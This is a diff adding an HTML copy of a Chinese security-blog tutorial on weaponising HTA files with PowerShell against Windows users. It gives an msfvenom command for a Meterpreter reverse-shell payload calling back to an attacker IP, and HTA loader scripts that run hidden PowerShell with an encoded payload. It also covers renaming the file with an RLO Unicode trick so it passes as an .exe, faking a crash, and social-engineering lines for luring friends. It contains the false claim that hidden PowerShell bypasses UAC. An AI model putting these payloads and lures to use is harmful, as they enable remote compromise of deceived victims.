@@ -1,1 +1,143 @@
-blog
+<!DOCTYPE html>
+<html>
+<head>
+<title>文档的标题</title>
+</head>
+
+<body>
+<div id="contenttxt">
+                            <p style="text-align: left;"><span style="color: rgb(0, 112, 192);">原创作者：LJokerP</span></p>
+<p style="text-align: center;"><a href="https://image.3001.net/images/20151219/14504739521589.jpg" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20151219/14504739521589.jpg!small" src="https://image.3001.net/images/20151219/14504739521589.jpg!small" title="c65030385343fbf28de3909ab27eca8064388f43.jpg" style="display: block;"></a></p>
+<noscript><img src="https://image.3001.net/images/20151219/14504739521589.jpg!small" title="c65030385343fbf28de3909ab27eca8064388f43.jpg"/></p></noscript>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>我去前面探探路<br></strong></span></p>
+<p><span id="_baidu_bookmark_end_7" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_5" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(0, 176, 80);"><strong>众所周知，Powershell早已被集成到了windows的环境中，国外大牛玩得不亦乐乎，而国内圈子却很少听到讨论Powershell的，至少我身边只有一位小伙伴一起研究，HTA更不用说了，不是学计算机的或许根本不知道这是什么鬼，当然也包括那些当年计算机基础翘课的……</strong></span></p>
+<pre class="prettyprint lang-html prettyprinted" style=""><span class="pln">男女搭配干活不累；
+我爸揍我、我妈踹我，混合双打；
+两王在手，拆开出、当炸弹打，怕了么；
+每每两强相遇，怪怪的灵感就来了；
+6级惹！看我QWER滚键盘式组合技！啪！啪！啪！</span></pre>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>金角大王 Powershell<br></strong></span></p>
+<p style="text-align: center;"><span id="_baidu_bookmark_end_31" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_29" style="display: none; line-height: 0px;">‍</span><a href="https://image.3001.net/images/20151219/14504740193413.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20151219/14504740193413.png!small" src="https://image.3001.net/images/20151219/14504740193413.png!small" title="32997fcbbcc3f14a78d2bef1482ed666.png" style="display: block;"></a></p>
+<noscript><img src="https://image.3001.net/images/20151219/14504740193413.png!small" title="32997fcbbcc3f14a78d2bef1482ed666.png"/></p></noscript>
+<p>Linux下有bash，Windows下有Powershell。Powershell依靠在.NET这个大树下，因此也有了比如直接调用windowsAPI等强大功能和利用价值。</p>
+<p>Powershell脚本后缀名为ps1，这种格式不像bat、vbs、exe等双击执行，而是需要经由powershell.exe启动，可以直接使用：</p>
+<pre class="prettyprint lang-ps prettyprinted" style=""><span class="typ">PowerShell</span><span class="pun">.</span><span class="pln">exe&nbsp;</span><span class="pun">-</span><span class="typ">ExecutionPolicy</span><span class="pln">&nbsp;</span><span class="typ">Bypass</span><span class="pln">&nbsp;</span><span class="pun">-</span><span class="typ">File</span><span class="pln">&nbsp;</span><span class="pun">.</span><span class="pln">\script</span><span class="pun">.</span><span class="pln">ps1</span></pre>
+<p>或者直接把脚本直接输入powershell执行。</p>
+<p>在win7和server08后，Powershell被集成在系统中，此举方便了服务器的管理，同样，过分的的强大也让自己危险了很多。</p>
+<p>相关内容：<a href="http://msdn.microsoft.com/en-us/library/dd835506(VS.85).aspx" target="_blank" textvalue="Microsoft某个文档">Microsoft某个文档</a>&nbsp;/&nbsp;<a href="http://baike.baidu.com/view/2838635.htm?fromtitle=PowerShell&amp;fromid=1061700&amp;type=syn" target="_blank" textvalue="Powershell_百度百科">Powershell_百度百科</a></p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>银角大王 HTA</strong></span></p>
+<p style="text-align: center;"><span id="_baidu_bookmark_end_71" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_69" style="display: none; line-height: 0px;">‍</span><a href="https://image.3001.net/images/20151219/14504740473089.jpg" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20151219/14504740473089.jpg!small" src="https://image.3001.net/images/20151219/14504740473089.jpg!small" title="200732414260543.jpg" style="display: block;"></a></p>
+<noscript><img src="https://image.3001.net/images/20151219/14504740473089.jpg!small" title="200732414260543.jpg"/></p></noscript>
+<p>hta格式，看上去一个陌生的后缀，但实际遨游网络的你天天都接触到，因为它也是网页格式的一种，类似于html/htm ，通过html语法编写内容。</p>
+<p>HTA是HTML-Application的缩写，是软件开发的新概念，直接将某个html页面保存成hta的格式，就是一个独立的应用软件，点开与网页内容并无区别，界面与VB、C++等程序语言所设计的软件界面没什么差别，显示为窗口交互界面。</p>
+<p><span style="color: rgb(0, 176, 80);"><strong>（可能大牛们hta已经玩烂了,但我还是要科普！就要！就是倔！）</strong></span></p>
+<p>相关内容：<a href="http://baike.baidu.com/link?url=rvJWqEcd_xUQmxFOUg_OX_9HegJQSVH7QfkccS2oihAubhViaZ9L2ZPJwRDV-Hnn70vAtzx-woC_RO40D6Snw_" target="_blank">HTA_百度百科</a></p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>就是个网页！不就是钓鱼嘛！用你教？<br></strong></span></p>
+<p><span id="_baidu_bookmark_end_103" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_101" style="display: none; line-height: 0px;">‍</span>答对了，确实类似于钓鱼，但是得补充一下，HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多，不但窗口界面跟其他软件相同，同时它也相应的具有类似于VB、C++编写的桌面程序的相同权限（读写文件、操作注册表等）。HTA本来就是被设计为制作桌面程序的，所以能直接调用其他组件执行命令。</p>
+<p>总的说，HTA是个披着web外衣的exe应用程序，要是加上Powershell……嘿嘿嘿 <a href="https://image.3001.net/images/index/smilies/icon_razz.gif" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/index/smilies/icon_razz.gif" src="https://image.3001.net/images/index/smilies/icon_razz.gif" alt=":P" class="wp-smiley" style="display: block;"></a>  （没有挖0day的技术，就放飞你的思路。）</p>
+<noscript><img src='https://image.3001.net/images/index/smilies/icon_razz.gif' alt=':P' class='wp-smiley' />  （没有挖0day的技术，就放飞你的思路。）</p></noscript>
+<p><span style="color: rgb(0, 112, 192);">Powershell利用脚本可以到Github上搜搜，歪果仁们的研究已然很透彻，有很多大牛的渗透脚本可以借鉴。</span></p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>跳刀躲梅肯，别笑，我要出招了<br></strong></span></p>
+<p><span id="_baidu_bookmark_end_129" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_127" style="display: none; line-height: 0px;">‍</span>先举个栗子：hello.hta（栗子没毒，复制粘贴放心食用~）</p>
+<pre class="prettyprint lang-html prettyprinted" style=""><span class="com">&lt;!--hello.hta--&gt;</span><span class="pln">
+</span><span class="tag">&lt;html&gt;</span><span class="pln">
+</span><span class="tag">&lt;head&gt;</span><span class="pln">
+</span><span class="tag">&lt;title&gt;</span><span class="pln">hello</span><span class="tag">&lt;/title&gt;</span><span class="pln">
+</span><span class="tag">&lt;meta</span><span class="pln">&nbsp;</span><span class="atn">http-equiv</span><span class="pun">=</span><span class="atv">"Content-Type"</span><span class="pln">&nbsp;</span><span class="atn">content</span><span class="pun">=</span><span class="atv">"text/html;&nbsp;charset=UTF-8"</span><span class="pln">&nbsp;</span><span class="tag">/&gt;</span><span class="pln">
+</span><span class="tag">&lt;HTA:ApplicationID</span><span class="pun">=</span><span class="atv">"oHTA"</span><span class="pln">&nbsp;</span><span class="atn">Applicationname</span><span class="pun">=</span><span class="atv">"hta_app"</span><span class="pln">&nbsp;</span><span class="atn">border</span><span class="pun">=</span><span class="atv">"thin"</span><span class="pln">&nbsp;</span><span class="atn">borderstyle</span><span class="pun">=</span><span class="atv">"normal"</span><span class="pln">&nbsp;</span><span class="atn">icon</span><span class="pun">=</span><span class="atv">"hello.ico"</span><span class="pln">&nbsp;</span><span class="atn">maximizebutton</span><span class="pun">=</span><span class="atv">"yes"</span><span class="pln">&nbsp;</span><span class="atn">minimizebutton</span><span class="pun">=</span><span class="atv">"yes"</span><span class="pln">&nbsp;</span><span class="atn">showintaskbar</span><span class="pun">=</span><span class="atv">"no"</span><span class="pln">&nbsp;</span><span class="atn">singleinstance</span><span class="pun">=</span><span class="atv">"no"</span><span class="pln">&nbsp;</span><span class="atn">sysmenu</span><span class="pun">=</span><span class="atv">"yes"</span><span class="pln">&nbsp;</span><span class="atn">version</span><span class="pun">=</span><span class="atv">"777"</span><span class="pln">&nbsp;</span><span class="atn">windowstate</span><span class="pun">=</span><span class="atv">"normal"</span><span class="pln">&nbsp;</span><span class="atn">scroll</span><span class="pun">=</span><span class="atv">"yes"</span><span class="tag">&gt;</span><span class="pln">
+</span><span class="tag">&lt;/head&gt;</span><span class="pln">
+</span><span class="tag">&lt;body&gt;</span><span class="pln">
+</span><span class="tag">&lt;center&gt;</span><span class="pln">
+</span><span class="tag">&lt;br&gt;</span><span class="pln">
+</span><span class="tag">&lt;h1&gt;</span><span class="pln">Hello&nbsp;HTA</span><span class="tag">&lt;/h1&gt;</span><span class="pln">
+</span><span class="tag">&lt;br&gt;</span><span class="pln">
+</span><span class="tag">&lt;h2&gt;</span><span class="pln">(&nbsp;⊙&nbsp;o&nbsp;⊙&nbsp;)/出来吧！计算器！</span><span class="tag">&lt;/h2&gt;</span><span class="pln">
+</span><span class="tag">&lt;br&gt;</span><span class="pln">
+</span><span class="tag">&lt;/center&gt;</span><span class="pln">
+</span><span class="tag">&lt;script</span><span class="pln">&nbsp;</span><span class="atn">language</span><span class="pun">=</span><span class="atv">"VBScript"</span><span class="tag">&gt;</span><span class="pln">
+</span><span class="typ">Set</span><span class="pln">&nbsp;</span><span class="typ">Hello</span><span class="pln">&nbsp;</span><span class="pun">=</span><span class="pln">&nbsp;</span><span class="typ">CreateObject</span><span class="pun">(</span><span class="str">"Wscript.Shell"</span><span class="pun">)</span><span class="pln">
+</span><span class="typ">Hello</span><span class="pun">.</span><span class="typ">Run</span><span class="pln">&nbsp;</span><span class="str">"calc.exe"</span><span class="pln">
+</span><span class="tag">&lt;/script&gt;</span><span class="pln">
+</span><span class="tag">&lt;/body&gt;</span><span class="pln">
+</span><span class="tag">&lt;/html&gt;</span></pre>
+<p style="text-align: center;"><a href="https://image.3001.net/images/20151219/14504740793634.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20151219/14504740793634.png!small" src="https://image.3001.net/images/20151219/14504740793634.png!small" title="QQ20151219-0@2x.png" style="display: block;"></a></p>
+<noscript><img src="https://image.3001.net/images/20151219/14504740793634.png!small" title="QQ20151219-0@2x.png"/></p></noscript>
+<p>虽然说也是静态页面，但hta脚本可以直接使用vbs并调用Wscript.Shell，毕竟人家是html家里的大哥大，偏应用型的脚本类型，所以说，如果把他想象成双击就能执行的“hta大马”毫不为过！（windows自带hta环境，cmd中输入 mshta 你会发现，已经集成在win环境里了，输入完并不会弹出什么，只是确定不报错就证明有这个东西，所以说白了，运行hta跟运行exe简直一样，双击即可。）在实例hello.hta中的 &lt;HTA:&gt; 是HTA的一些参数设置，设置详情见之前HTA相关内容链接。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>已然有了HTA的完美辅助，如果加上Powershell的暴力输出呢？<br></strong></span></p>
+<p><span id="_baidu_bookmark_end_153" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_151" style="display: none; line-height: 0px;">‍</span>答案是：你们随便选吧，我来打崩三路。</p>
+<p><span style="color: rgb(0, 112, 192);">PS: 写了老久调用powershell的hta，越写越不对劲儿，干脆借鉴Github上人家写的注入ShellCode脚本，打开Matesploit准备生成Shellcode，突然发现msfvenom上原来已经有hta-psh现成的format了，省时省力，那就加以利用好了。(我凑，之前没注意到呢……)</span></p>
+<p>好吧，我们来直接成一个hta-psh的回弹脚本：</p>
+<pre class="prettyprint lang-bash prettyprinted" style=""><span class="pln">msfvenom&nbsp;</span><span class="pun">-</span><span class="pln">p&nbsp;windows</span><span class="pun">/</span><span class="pln">meterpreter</span><span class="pun">/</span><span class="pln">reverse_tcp&nbsp;lhost</span><span class="pun">=</span><span class="lit">175.xxx</span><span class="pun">.</span><span class="pln">xxx</span><span class="pun">.</span><span class="pln">xxx&nbsp;lport</span><span class="pun">=</span><span class="lit">8081</span><span class="pln">&nbsp;</span><span class="pun">-</span><span class="pln">f&nbsp;hta</span><span class="pun">-</span><span class="pln">psh&nbsp;</span><span class="pun">-</span><span class="pln">o&nbsp;test</span><span class="pun">.</span><span class="pln">hta</span></pre>
+<p>（生成的脚本内容经过base64encode加密，想学习的同学可以把base64部分还原，观察编写语法。）</p>
+<p style="text-align: center;"><a href="https://image.3001.net/images/20151219/14504741587223.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20151219/14504741587223.png!small" src="https://image.3001.net/images/20151219/14504741587223.png!small" title="QQ20151219-3@2x.png" style="display: block;"></a></p>
+<noscript><img src="https://image.3001.net/images/20151219/14504741587223.png!small" title="QQ20151219-3@2x.png"/></p></noscript>
+<p>发给朋友试试，（各种杀毒，安全狗，老大哥型测试环境）直接弹回了一个meterpreter_shell，从点击到回弹间隔了5到6秒，估计因为调用powershell和base64处理时间（第二次貌似点开就快了些），全过程并且没有触发到杀毒，连提醒都没有，真正“开袋即食”。</p>
+<p><strong>原因分析：</strong></p>
+<pre class="prettyprint lang-html prettyprinted" style=""><span class="pln">1.&nbsp;HTA依赖于mshta.exe解析，而mshta.exe是系统下自带的，所以并不用免杀就能直接调用执行，不会像vbs脚本被花式吊打。
+2.&nbsp;Powershell嘛，同理是windows的自己人，加上参数&nbsp;-nop&nbsp;-w&nbsp;hidden&nbsp;后，能强行绕过UAC执行命令。
+3.&nbsp;端口选取8081也是一个原因，因为很少有杀毒拦截常见的http端口，如&nbsp;80&nbsp;/&nbsp;443&nbsp;/&nbsp;21&nbsp;/&nbsp;22&nbsp;/&nbsp;25&nbsp;/&nbsp;445&nbsp;/&nbsp;1433&nbsp;/&nbsp;3306&nbsp;/&nbsp;3389&nbsp;/&nbsp;8080&nbsp;/&nbsp;8888&nbsp;等，在不占用的情况下都可加以利用。</span></pre>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>如此生僻的格式谁会去点开？怎么利用？<br></strong></span></p>
+<p><span id="_baidu_bookmark_end_185" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_183" style="display: none; line-height: 0px;">‍</span>答：我！我！选我！选我！:P</p>
+<p>确实，一个hta后缀的文件，见都没见过呢，图标还是个执行文件，打开显示一个白板，十分可疑……！辣摸……这时候就要靠猴子派来的救兵辣！</p>
+<p>So，问题来了，你知道<strong>Unicode控制符</strong>么……</p>
+<p>Unicode控制符：控制文字显示属性，实现类似倒序显示等属性设定。而这个特点，在文件名中同样适用！就让我们用控制符给他改个名字，再把内容丰富美化一下，再结合你聪(猥)明(琐)的灵感加上少许社工的魅力，分分钟弹shell不是梦~</p>
+<p><strong>来，再举个栗子：deexe.hta</strong></p>
+<pre class="prettyprint lang-html prettyprinted" style=""><span class="tag">&lt;title&gt;</span><span class="pln">XXX-exp</span><span class="tag">&lt;/title&gt;</span><span class="pln">
+</span><span class="tag">&lt;center&gt;</span><span class="pln">
+</span><span class="tag">&lt;h1&gt;</span><span class="pln">XXX-exp:&nbsp;death.exe</span><span class="tag">&lt;/h1&gt;</span><span class="pln">
+</span><span class="tag">&lt;br&gt;</span><span class="pln">
+</span><span class="tag">&lt;h2&gt;</span><span class="pln">Loading...</span><span class="tag">&lt;/h2&gt;</span><span class="pln">
+</span><span class="tag">&lt;br&gt;</span><span class="pln">
+[</span><span class="tag">&lt;marquee</span><span class="pln">&nbsp;</span><span class="atn">scrollAmount</span><span class="pun">=</span><span class="atv">4</span><span class="pln">&nbsp;</span><span class="atn">width</span><span class="pun">=</span><span class="atv">350</span><span class="pln">&nbsp;</span><span class="atn">direction</span><span class="pun">=</span><span class="atv">right</span><span class="tag">&gt;</span><span class="pln">|||||||||||||</span><span class="tag">&lt;/marquee&gt;</span><span class="pln">]35%
+</span><span class="tag">&lt;br&gt;</span><span class="pln">
+</span><span class="tag">&lt;/center&gt;</span><span class="pln">
+</span><span class="tag">&lt;script</span><span class="pln">&nbsp;</span><span class="atn">language</span><span class="pun">=</span><span class="atv">"VBScript"</span><span class="tag">&gt;</span><span class="pln">
+&nbsp;&nbsp;</span><span class="typ">Set</span><span class="pln">&nbsp;</span><span class="typ">Hackdo</span><span class="pln">&nbsp;</span><span class="pun">=</span><span class="pln">&nbsp;</span><span class="typ">CreateObject</span><span class="pun">(</span><span class="str">"Wscript.Shell"</span><span class="pun">)</span><span class="pln">
+&nbsp;&nbsp;</span><span class="typ">Set</span><span class="pln">&nbsp;</span><span class="typ">Check</span><span class="pln">&nbsp;</span><span class="pun">=</span><span class="pln">&nbsp;</span><span class="typ">CreateObject</span><span class="pun">(</span><span class="str">"Scripting.FileSystemObject"</span><span class="pun">)</span><span class="pln">
+&nbsp;&nbsp;</span><span class="typ">If</span><span class="pln">&nbsp;</span><span class="typ">Check</span><span class="pun">.</span><span class="typ">FileExists</span><span class="pun">(</span><span class="typ">Hackdo</span><span class="pun">.</span><span class="typ">ExpandEnvironmentStrings</span><span class="pun">(</span><span class="str">"%PSModulePath%"</span><span class="pun">)</span><span class="pln">&nbsp;</span><span class="pun">+</span><span class="pln">&nbsp;</span><span class="str">"..\powershell.exe"</span><span class="pun">)</span><span class="pln">&nbsp;</span><span class="typ">Then</span><span class="pln">
+&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="typ">Hackdo</span><span class="pun">.</span><span class="typ">Run</span><span class="pln">&nbsp;</span><span class="str">"powershell.exe&nbsp;-nop&nbsp;-w&nbsp;hidden&nbsp;calc.exe"</span><span class="pln">
+&nbsp;&nbsp;</span><span class="typ">End</span><span class="pln">&nbsp;</span><span class="typ">If</span><span class="pln">
+</span><span class="tag">&lt;/script&gt;</span></pre>
+<p>出现这样一个画面，是不是也会让人反应几秒呢~ 停！别喷了，我知道大家比我做的肯定好_(:зゝ∠)_</p>
+<p style="text-align: center;"><a href="https://image.3001.net/images/20151219/14504742025337.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20151219/14504742025337.png!small" src="https://image.3001.net/images/20151219/14504742025337.png!small" title="QQ20151219-2@2x.png" style="display: block;"></a></p>
+<noscript><img src="https://image.3001.net/images/20151219/14504742025337.png!small" title="QQ20151219-2@2x.png"/></p></noscript>
+<p>只要替换其中Powershell命令为：</p>
+<pre class="prettyprint lang-ps prettyprinted" style=""><span class="pln">pwershell</span><span class="pun">.</span><span class="pln">exe&nbsp;</span><span class="pun">-</span><span class="pln">nop&nbsp;</span><span class="pun">-</span><span class="pln">w&nbsp;hidden&nbsp;</span><span class="pun">-</span><span class="pln">e&nbsp;</span><span class="pun">...</span><span class="pln">base64</span><span class="pun">-</span><span class="pln">ps1</span><span class="pun">-</span><span class="pln">payload</span><span class="pun">-</span><span class="pln">balabalabala</span><span class="pun">...</span></pre>
+<p>就能按你所想执行你的命令了！</p>
+<p><span style="color: rgb(0, 176, 80);"><strong>社工方面，美化可以集思广益，营造出完美的画面效果，哪怕利用控制符保存为html后缀，界面换成黑页。</strong></span></p>
+<pre class="prettyprint lang-html prettyprinted" style=""><span class="pln">“新做了个美到没朋友的黑页，来，发给你看看。”——人，所有理性事件中的感性漏洞也。</span></pre>
+<p>（理论上可以通过&lt;HTA:&gt;标签来控制图标的，不知为何测试不成功。）</p>
+<p>如果想假装闪退效果，可以直接在脚本结尾加入执行 “taskkill /f /im mshta.exe” kill掉mshta的进程，因为shellcode是注入在powershell中执行的，只要powershell健在，session就能保持住。<br></p>
+<pre class="prettyprint lang-html prettyprinted" style=""><span class="tag">&lt;script</span><span class="pln">&nbsp;</span><span class="atn">language</span><span class="pun">=</span><span class="atv">"VBScript"</span><span class="tag">&gt;</span><span class="pln">
+&nbsp;&nbsp;</span><span class="typ">Set</span><span class="pln">&nbsp;</span><span class="typ">Hackdo</span><span class="pln">&nbsp;</span><span class="pun">=</span><span class="pln">&nbsp;</span><span class="typ">CreateObject</span><span class="pun">(</span><span class="str">"Wscript.Shell"</span><span class="pun">)</span><span class="pln">
+&nbsp;&nbsp;</span><span class="typ">Set</span><span class="pln">&nbsp;</span><span class="typ">Check</span><span class="pln">&nbsp;</span><span class="pun">=</span><span class="pln">&nbsp;</span><span class="typ">CreateObject</span><span class="pun">(</span><span class="str">"Scripting.FileSystemObject"</span><span class="pun">)</span><span class="pln">
+&nbsp;&nbsp;</span><span class="typ">If</span><span class="pln">&nbsp;</span><span class="typ">Check</span><span class="pun">.</span><span class="typ">FileExists</span><span class="pun">(</span><span class="typ">Hackdo</span><span class="pun">.</span><span class="typ">ExpandEnvironmentStrings</span><span class="pun">(</span><span class="str">"%PSModulePath%"</span><span class="pun">)</span><span class="pln">&nbsp;</span><span class="pun">+</span><span class="pln">&nbsp;</span><span class="str">"..\powershell.exe"</span><span class="pun">)</span><span class="pln">&nbsp;</span><span class="typ">Then</span><span class="pln">
+&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="typ">Hackdo</span><span class="pun">.</span><span class="typ">Run</span><span class="pln">&nbsp;</span><span class="str">"powershell.exe&nbsp;-nop&nbsp;-w&nbsp;hidden&nbsp;calc.exe"</span><span class="pln">
+&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="typ">Hackdo</span><span class="pun">.</span><span class="typ">Run</span><span class="pln">&nbsp;</span><span class="str">"taskkill&nbsp;/f&nbsp;/im&nbsp;mshta.exe"</span><span class="pln">
+&nbsp;&nbsp;</span><span class="typ">End</span><span class="pln">&nbsp;</span><span class="typ">If</span><span class="pln">
+</span><span class="tag">&lt;/script&gt;</span></pre>
+<p><span style="color: rgb(0, 112, 192);">PS: 实际渗透中，得到session后记得赶紧 migrate [another-pid] 哦~</span></p>
+<p>这只是个弹计算器的脚本，大可拷贝下来实际操作一遍，拷贝，新建txt文档，打开，粘贴并保存为名称deexe.hta，右键重命名，光标放在de和exe.hta之间点击右键，选择插入Unicode控制符，点击插入RLO。</p>
+<p>Walaaa~ 恭喜获得新名称death.exe！替换成执行msf_reverse，赶紧发给好基友试射新造的核弹！</p>
+<p style="text-align: center;"><a href="https://image.3001.net/images/20151219/14504743004170.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20151219/14504743004170.png!small" src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" title="QQ20151219-1@2x.png"></a></p>
+<noscript><img src="https://image.3001.net/images/20151219/14504743004170.png!small" title="QQ20151219-1@2x.png"/></p></noscript>
+<p><span style="color: rgb(0, 112, 192);"><strong>场景模拟：</strong></span></p>
+<p>“我写了个0day，xxx-server直接秒！先发给你玩玩？”</p>
+<p>“好呀好呀！咦？一直读取…… 咦？闪退了……”</p>
+<p>“你删了吧！有bug! 我再改改……”</p>
+<p>( 1… 2… 3… 弹弹弹，战个痛！ <a href="https://image.3001.net/images/index/smilies/icon_razz.gif" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/index/smilies/icon_razz.gif" src="https://image.3001.net/images/index/smilies/icon_razz.gif" alt=":P" class="wp-smiley" style="display: block;"></a>  )</p>
+<noscript><img src='https://image.3001.net/images/index/smilies/icon_razz.gif' alt=':P' class='wp-smiley' />  )</p></noscript>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38);"><strong><span style="font-size: 18px;">我有两把枪，一把叫Power射，一把叫HT啊<br></span></strong></span></p>
+<p style="text-align: center;"><span id="_baidu_bookmark_end_229" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_227" style="display: none; line-height: 0px;">‍</span><a href="https://image.3001.net/images/20151219/1450474356384.jpg" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20151219/1450474356384.jpg!small" src="https://image.3001.net/images/20151219/1450474356384.jpg!small" title="00016c58d8d5140131d740.jpg" style="display: block;"></a></p>
+<noscript><img src="https://image.3001.net/images/20151219/1450474356384.jpg!small" title="00016c58d8d5140131d740.jpg"/></p></noscript>
+<p>4767字……赶上一篇小论文了……</p>
+<p>那今天就介绍到这啦，更多新姿势改天聊！</p>
+<p><span style="color: rgb(0, 112, 192);">PS: 这Coser像不像邓紫棋 (づ￣3￣)づ╭❤～</span></p>
+<p><span style="color: rgb(255, 0, 0);"><strong>*本文作者：LJokerP，本文属FreeBuf原创奖励计划，未经许可禁止转载</strong></span></p>
+<div id="xunlei_com_thunder_helper_plugin_d462f475-c18e-46be-bd10-327458d045bd"></div>
+                        </div>
+
+
+</body>
+
+</html>
